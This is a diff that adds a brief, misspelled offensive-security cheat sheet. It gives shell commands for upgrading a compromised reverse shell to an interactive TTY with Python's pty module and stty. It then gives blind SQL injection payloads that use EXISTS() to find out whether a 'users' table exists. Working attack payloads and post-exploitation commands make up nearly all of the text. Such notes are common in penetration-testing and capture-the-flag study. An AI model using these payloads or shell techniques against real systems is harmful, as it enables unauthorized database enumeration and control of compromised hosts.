@@ -1,0 +1,13 @@
+TTY shell Spwan Using Python:
+python3 -c 'import pty; pty.spawn("/bin/bash");'
+stty raw -echo; fg
+export TERM=xterm
+
+
+Datamine Table Name Blind Sqli Tacktikes and Teknikes:
+Use EXISTS() fun to know if its exists or not if it is exists the statment will returen true esle flase
+exmples to use
+1/
+12' OR EXISTS(SELECT 1 FROM users LIMIT 1)-- -
+2/
+' OR (EXISTS(SELECT 1 FROM users WHERE id > 0))-- -
